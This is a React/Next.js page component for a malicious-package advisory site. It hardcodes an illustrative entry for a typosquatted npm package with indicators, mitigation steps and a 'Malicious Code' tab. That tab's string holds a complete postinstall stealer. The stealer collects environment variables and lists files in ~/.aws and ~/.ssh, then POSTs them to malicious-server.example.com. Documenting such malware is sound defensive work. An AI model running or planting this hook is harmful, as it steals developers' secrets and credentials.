import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Button } from "@/components/ui/button"
import { Package, ArrowLeft, ExternalLink, AlertTriangle, Calendar, User } from "lucide-react"
import Link from "next/link"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import CopyButton from "@/components/copy-button"

interface MaliciousPackagePageProps {
  params: {
    id: string
  }
}

export default function MaliciousPackagePage({ params }: MaliciousPackagePageProps) {
  // This would normally come from a database or API
  // For this example, we'll just hardcode a sample malicious package
  const pkg = {
    id: params.id,
    name: "color-rgba",
    ecosystem: "npm",
    version: "1.2.0",
    discoveredDate: "2023-02-10",
    reportedBy: "KhulnaSoft Security Team",
    maliciousActivity: "Data exfiltration",
    description:
      "A malicious package that steals environment variables and sends them to an attacker-controlled server.",
    details: `
      <p>This package was published to npm as a typosquatting attack targeting the legitimate 'color-rgba' package. The malicious version contains code that exfiltrates sensitive information from the victim's environment.</p>
      
      <p>When installed, the package executes a postinstall script that:</p>
      
      <ul>
        <li>Collects environment variables, including potential API keys and secrets</li>
        <li>Gathers system information such as hostname, username, and network configuration</li>
        <li>Searches for configuration files that might contain credentials</li>
        <li>Sends the collected data to an attacker-controlled server</li>
      </ul>
      
      <p>The package was designed to appear legitimate by providing the expected functionality while performing malicious activities in the background.</p>
    `,
    indicators: [
      "Suspicious postinstall script",
      "Network connections to unknown domains",
      "Accessing environment variables and configuration files",
      "Obfuscated code to hide malicious functionality",
    ],
    maliciousCode: `// Malicious postinstall script
const { exec } = require('child_process');
const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');

// Collect environment variables
const env = JSON.stringify(process.env);

// Collect system information
const hostname = os.hostname();
const username = os.userInfo().username;
const homedir = os.homedir();

// Look for config files
const configFiles = [];
const searchPaths = [
  path.join(homedir, '.aws'),
  path.join(homedir, '.ssh'),
  path.join(homedir, '.npm'),
  path.join(homedir, '.config')
];

searchPaths.forEach(dir => {
  if (fs.existsSync(dir)) {
    try {
      const files = fs.readdirSync(dir);
      files.forEach(file => {
        configFiles.push(path.join(dir, file));
      });
    } catch (e) {
      // Silently fail
    }
  }
});

// Exfiltrate data
const data = {
  env,
  hostname,
  username,
  configFiles
};

const options = {
  hostname: 'malicious-server.example.com',
  port: 443,
  path: '/collect',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  }
};

try {
  const req = https.request(options, (res) => {
    // Handle response
  });
  
  req.on('error', (e) => {
    // Silently fail
  });
  
  req.write(JSON.stringify(data));
  req.end();
} catch (e) {
  // Silently fail
}

// Execute legitimate functionality to avoid suspicion
require('./index.js');`,
    mitigation: `
      <p>If you have installed this package, you should:</p>
      
      <ol>
        <li>Remove the package immediately: <code>npm uninstall color-rgba</code></li>
        <li>Check for any unauthorized access or data breaches</li>
        <li>Rotate any exposed secrets or API keys</li>
        <li>Review your system for other signs of compromise</li>
        <li>Use a package security scanning tool to detect similar threats</li>
      </ol>
      
      <p>To prevent similar attacks in the future:</p>
      
      <ul>
        <li>Use package lockfiles to pin dependencies to known-good versions</li>
        <li>Implement integrity checking for your dependencies</li>
        <li>Use a private registry or a security proxy for npm</li>
        <li>Implement runtime protection to detect and block suspicious behavior</li>
      </ul>
    `,
    references: [
      {
        title: "KhulnaSoft Security Advisory",
        url: "https://github.com/khulnasoft-lab/malicious-packages/blob/main/npm/color-rgba.md",
      },
      {
        title: "npm Security Advisory",
        url: "https://www.npmjs.com/advisories/example",
      },
      {
        title: "CISA Alert",
        url: "https://www.cisa.gov/news-events/alerts/example",
      },
    ],
    relatedPackages: [
      {
        name: "event-source",
        id: "pkg-2023-003",
        ecosystem: "npm",
      },
      {
        name: "request-modules",
        id: "pkg-2023-004",
        ecosystem: "npm",
      },
    ],
  }

  const getEcosystemClass = (ecosystem: string) => {
    switch (ecosystem) {
      case "npm":
        return "bg-red-500/20 text-red-500 border-red-500/30"
      case "PyPI":
        return "bg-blue-500/20 text-blue-500 border-blue-500/30"
      case "RubyGems":
        return "bg-red-700/20 text-red-700 border-red-700/30"
      case "Maven":
        return "bg-orange-500/20 text-orange-500 border-orange-500/30"
      case "Go":
        return "bg-cyan-500/20 text-cyan-500 border-cyan-500/30"
      case "Composer":
        return "bg-purple-500/20 text-purple-500 border-purple-500/30"
      default:
        return "bg-primary/10 text-primary border-primary/30"
    }
  }

  return (
    <div className="container py-8">
      <div className="flex flex-col gap-6">
        <Button variant="ghost" size="sm" asChild className="self-start hover:bg-primary/10">
          <Link href="/malware/packages" className="flex items-center gap-1">
            <ArrowLeft className="h-4 w-4" />
            Back to malicious packages
          </Link>
        </Button>

        <div className="flex flex-col md:flex-row justify-between md:items-start gap-4">
          <div>
            <div className="flex items-center gap-2">
              <Badge variant="outline" className={getEcosystemClass(pkg.ecosystem)}>
                {pkg.ecosystem}
              </Badge>
              <Badge variant="outline" className="bg-primary/10 text-primary border-primary/30">
                {pkg.maliciousActivity}
              </Badge>
            </div>
            <h1 className="text-3xl font-bold mt-2 glow-text shadow-primary">{pkg.name}</h1>
            <p className="text-muted-foreground mt-1 max-w-3xl">{pkg.description}</p>
          </div>
          <div className="flex items-center gap-2">
            <Button variant="outline" className="border-primary/40 hover:bg-primary/10" asChild>
              <a
                href={`https://github.com/khulnasoft-lab/malicious-packages/blob/main/${pkg.ecosystem.toLowerCase()}/${
                  pkg.name
                }.md`}
                target="_blank"
                rel="noopener noreferrer"
                className="flex items-center gap-2"
              >
                View on GitHub <ExternalLink className="h-4 w-4" />
              </a>
            </Button>
          </div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
          <div className="md:col-span-2">
            <Tabs defaultValue="overview">
              <TabsList className="mb-4 bg-muted/50">
                <TabsTrigger value="overview">Overview</TabsTrigger>
                <TabsTrigger value="details">Details</TabsTrigger>
                <TabsTrigger value="code">Malicious Code</TabsTrigger>
                <TabsTrigger value="mitigation">Mitigation</TabsTrigger>
              </TabsList>

              <TabsContent value="overview" className="space-y-6">
                <Card className="bg-background/40 backdrop-blur-sm border-primary/20 card-hover">
                  <CardContent className="p-6">
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                      <div>
                        <h3 className="text-sm font-medium text-muted-foreground mb-2">Package Name</h3>
                        <p className="font-medium">{pkg.name}</p>
                      </div>
                      <div>
                        <h3 className="text-sm font-medium text-muted-foreground mb-2">Ecosystem</h3>
                        <p className="font-medium">{pkg.ecosystem}</p>
                      </div>
                      <div>
                        <h3 className="text-sm font-medium text-muted-foreground mb-2">Version</h3>
                        <p>{pkg.version}</p>
                      </div>
                      <div>
                        <h3 className="text-sm font-medium text-muted-foreground mb-2">Discovery Date</h3>
                        <p>{pkg.discoveredDate}</p>
                      </div>
                      <div>
                        <h3 className="text-sm font-medium text-muted-foreground mb-2">Reported By</h3>
                        <p>{pkg.reportedBy}</p>
                      </div>
                      <div>
                        <h3 className="text-sm font-medium text-muted-foreground mb-2">Malicious Activity</h3>
                        <p>{pkg.maliciousActivity}</p>
                      </div>
                    </div>
                  </CardContent>
                </Card>

                <div>
                  <h2 className="text-xl font-bold mb-3 flex items-center gap-2">
                    <AlertTriangle className="h-5 w-5 text-amber-500" />
                    Indicators of Compromise
                  </h2>
                  <Card className="bg-background/40 backdrop-blur-sm border-amber-500/20 card-hover">
                    <CardContent className="p-6">
                      <ul className="space-y-2">
                        {pkg.indicators.map((indicator, index) => (
                          <li key={index} className="flex items-start gap-2">
                            <span className="h-2 w-2 rounded-full bg-amber-500 mt-2"></span>
                            <span>{indicator}</span>
                          </li>
                        ))}
                      </ul>
                    </CardContent>
                  </Card>
                </div>
              </TabsContent>

              <TabsContent value="details">
                <Card className="bg-background/40 backdrop-blur-sm border-primary/20 card-hover">
                  <CardContent className="p-6">
                    <div
                      className="prose max-w-none dark:prose-invert prose-headings:text-foreground prose-a:text-primary"
                      dangerouslySetInnerHTML={{ __html: pkg.details }}
                    />
                  </CardContent>
                </Card>
              </TabsContent>

              <TabsContent value="code">
                <Card className="bg-background/40 backdrop-blur-sm border-primary/20 card-hover">
                  <CardContent className="p-6">
                    <div className="flex items-center justify-between mb-4">
                      <h3 className="font-medium">Malicious Code Sample</h3>
                      <CopyButton text={pkg.maliciousCode} />
                    </div>
                    <pre className="bg-muted/50 p-4 rounded-md overflow-x-auto border border-primary/20">
                      <code className="text-sm text-primary whitespace-pre">{pkg.maliciousCode}</code>
                    </pre>
                  </CardContent>
                </Card>
              </TabsContent>

              <TabsContent value="mitigation">
                <Card className="bg-background/40 backdrop-blur-sm border-primary/20 card-hover">
                  <CardContent className="p-6">
                    <div
                      className="prose max-w-none dark:prose-invert prose-headings:text-foreground prose-a:text-primary"
                      dangerouslySetInnerHTML={{ __html: pkg.mitigation }}
                    />
                  </CardContent>
                </Card>
              </TabsContent>
            </Tabs>
          </div>

          <div className="space-y-6">
            <Card className="bg-background/40 backdrop-blur-sm border-primary/20 card-hover">
              <CardHeader>
                <CardTitle className="text-lg">Report Information</CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="flex items-center gap-2">
                  <Calendar className="h-4 w-4 text-muted-foreground" />
                  <div>
                    <p className="text-sm font-medium">Discovery Date</p>
                    <p className="text-sm text-muted-foreground">{pkg.discoveredDate}</p>
                  </div>
                </div>
                <div className="flex items-center gap-2">
                  <User className="h-4 w-4 text-muted-foreground" />
                  <div>
                    <p className="text-sm font-medium">Reported By</p>
                    <p className="text-sm text-muted-foreground">{pkg.reportedBy}</p>
                  </div>
                </div>
              </CardContent>
            </Card>

            <Card className="bg-background/40 backdrop-blur-sm border-primary/20 card-hover">
              <CardHeader>
                <CardTitle className="text-lg">References</CardTitle>
              </CardHeader>
              <CardContent>
                <ul className="space-y-2">
                  {pkg.references.map((ref, index) => (
                    <li key={index}>
                      <a
                        href={ref.url}
                        target="_blank"
                        rel="noopener noreferrer"
                        className="flex items-center gap-2 text-primary hover:underline"
                      >
                        {ref.title}
                        <ExternalLink className="h-3 w-3" />
                      </a>
                    </li>
                  ))}
                </ul>
              </CardContent>
            </Card>

            <Card className="bg-background/40 backdrop-blur-sm border-primary/20 card-hover">
              <CardHeader>
                <CardTitle className="text-lg">Related Malicious Packages</CardTitle>
              </CardHeader>
              <CardContent>
                <ul className="space-y-2">
                  {pkg.relatedPackages.map((relatedPkg, index) => (
                    <li key={index}>
                      <Link
                        href={`/malware/packages/${relatedPkg.id}`}
                        className="flex items-center gap-2 text-primary hover:underline"
                      >
                        <Package className="h-3 w-3" />
                        {relatedPkg.name}
                        <Badge variant="outline" className={getEcosystemClass(relatedPkg.ecosystem)}>
                          {relatedPkg.ecosystem}
                        </Badge>
                      </Link>
                    </li>
                  ))}
                </ul>
              </CardContent>
            </Card>
          </div>
        </div>
      </div>
    </div>
  )
}
